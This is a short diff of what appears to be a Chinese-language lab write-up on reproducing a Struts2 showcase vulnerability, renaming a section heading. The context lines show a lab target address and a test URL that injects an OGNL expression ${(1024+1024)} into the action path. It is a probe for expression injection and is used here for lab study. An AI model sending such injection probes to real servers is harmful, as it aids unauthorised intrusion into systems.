@@ -76,7 +76,7 @@ docker-compose up -d
 ![](./4.jpg)
 
 
-# 0x04  漏洞验证
+# 0x04  漏洞复现
 靶机地址：`http://192.168.96.130:8080/struts2-showcase/`
 
 命令执行：`http://192.168.96.130:8080/struts2-showcase/${(1024+1024)}/actionChain1.action`
